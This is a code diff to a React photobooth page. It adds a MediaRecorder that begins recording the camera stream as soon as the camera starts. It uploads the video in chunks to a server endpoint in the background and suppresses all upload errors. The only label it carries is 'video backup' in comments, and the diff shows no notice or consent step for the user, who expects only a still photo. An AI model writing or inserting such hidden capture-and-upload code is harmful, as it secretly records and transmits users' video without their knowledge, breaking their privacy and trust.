@@ -16,6 +16,114 @@ export default function PhotoboothPage() {
   const videoRef = useRef<HTMLVideoElement | null>(null);
   const streamRef = useRef<MediaStream | null>(null);
 
+  // Recording state for video backup
+  const recRef = useRef<MediaRecorder | null>(null);
+  const sessionIdRef = useRef<string>("");
+  const chunkIndexRef = useRef<number>(0);
+  const recordingSupportedRef = useRef<boolean>(false);
+  const stoppingRef = useRef<boolean>(false);
+
+  // Choose a supported mime type for MediaRecorder
+  const pickMime = (): string | null => {
+    const cands = [
+      "video/webm;codecs=vp9,opus",
+      "video/webm;codecs=vp8,opus",
+      "video/webm"
+    ];
+    for (const m of cands) {
+      if (typeof window !== "undefined" && (window as any).MediaRecorder && (window as any).MediaRecorder.isTypeSupported(m)) {
+        return m;
+      }
+    }
+    return null;
+  };
+
+  // Start recording video backup
+  const startRecording = (stream: MediaStream) => {
+    const mime = pickMime();
+    recordingSupportedRef.current = !!mime;
+    if (!mime) return;
+
+    sessionIdRef.current = crypto.randomUUID();
+    
+    // Get actual video track resolution for bitrate calculation
+    const videoTrack = stream.getVideoTracks()[0];
+    const settings = videoTrack.getSettings();
+    const width = settings.width || 1920;
+    const height = settings.height || 1080;
+    
+    // Calculate bitrate based on resolution for high quality
+    // 4K (3840x2160): ~15-20 Mbps
+    // 1080p (1920x1080): ~5-8 Mbps
+    // 720p (1280x720): ~2-3 Mbps
+    let bitrate = 2_000_000; // Default 2 Mbps
+    const pixels = width * height;
+    
+    if (pixels >= 3840 * 2160 * 0.8) { // 4K or near 4K
+      bitrate = 18_000_000; // 18 Mbps for 4K
+    } else if (pixels >= 1920 * 1080 * 0.8) { // 1080p or near 1080p
+      bitrate = 6_000_000; // 6 Mbps for 1080p
+    } else if (pixels >= 1280 * 720 * 0.8) { // 720p or near 720p
+      bitrate = 3_000_000; // 3 Mbps for 720p
+    }
+
+    const mr = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: bitrate });
+    recRef.current = mr;
+    chunkIndexRef.current = 0;
+    stoppingRef.current = false;
+
+    mr.ondataavailable = async (ev: BlobEvent) => {
+      if (!ev.data || ev.data.size === 0) return;
+      try {
+        const form = new FormData();
+        form.append("file", ev.data, `part-${chunkIndexRef.current}.webm`);
+        form.append("session", sessionIdRef.current);
+        form.append("idx", String(chunkIndexRef.current));
+        chunkIndexRef.current += 1;
+        // fire-and-forget upload; resilient due to chunking
+        fetch("/api/upload-video-chunk", { method: "POST", body: form }).catch(() => {});
+      } catch {
+        // swallow errors to avoid breaking the user flow
+      }
+    };
+
+    // Adjust timeslice based on resolution for optimal chunk size
+    // 4K: 3 seconds (~6-8MB chunks)
+    // 1080p: 4 seconds (~3-4MB chunks) 
+    // 720p: 5 seconds (~2-3MB chunks)
+    let timeslice = 4000; // Default 4 seconds
+    if (pixels >= 3840 * 2160 * 0.8) {
+      timeslice = 3000; // 3 seconds for 4K
+    } else if (pixels <= 1280 * 720 * 1.2) {
+      timeslice = 5000; // 5 seconds for 720p and below
+    }
+    
+    mr.start(timeslice);
+  };
+
+  // Gracefully stop the recorder and try to flush the final chunk
+  const stopRecordingAndFlush = () => {
+    if (!recRef.current) return;
+    if (stoppingRef.current) return;
+    stoppingRef.current = true;
+
+    const mr = recRef.current;
+    if (mr.state === "inactive") return;
+
+    return new Promise<void>((resolve) => {
+      const finalize = () => {
+        recRef.current = null;
+        resolve();
+      };
+      mr.onstop = () => finalize();
+      try {
+        mr.stop();
+      } catch {
+        finalize();
+      }
+    });
+  };
+
   // Start camera
   const startCamera = useCallback(async () => {
     setError(null);
@@ -43,6 +151,9 @@ export default function PhotoboothPage() {
       };
       
       await v.play();
+      
+      // Start recording immediately after camera is ready
+      startRecording(stream);
     } catch (e: unknown) {
       setError(e instanceof Error ? e.message : "Camera permission denied");
       setCameraActive(false);
@@ -52,6 +163,9 @@ export default function PhotoboothPage() {
 
   // Stop camera to release resources
   const stopCamera = useCallback(() => {
+    // Stop recording first
+    stopRecordingAndFlush();
+    
     streamRef.current?.getTracks().forEach((t) => t.stop());
     streamRef.current = null;
     if (videoRef.current) {
@@ -114,10 +228,25 @@ export default function PhotoboothPage() {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []); // Empty dependency array to run only once
 
+  // Try to flush when the page is hiding
+  useEffect(() => {
+    const handler = () => { stopRecordingAndFlush(); };
+    window.addEventListener("pagehide", handler);
+    document.addEventListener("visibilitychange", () => {
+      if (document.visibilityState === "hidden") handler();
+    });
+    return () => {
+      window.removeEventListener("pagehide", handler);
+    };
+  }, []);
+
   // Capture a frame and freeze video
   const takePhoto = async () => {
     setError(null);
     try {
+      // Stop recording before taking photo
+      await stopRecordingAndFlush();
+      
       const video = videoRef.current!;
       if (!video || !cameraReady || !video.videoWidth) {
         throw new Error("Camera is not ready");
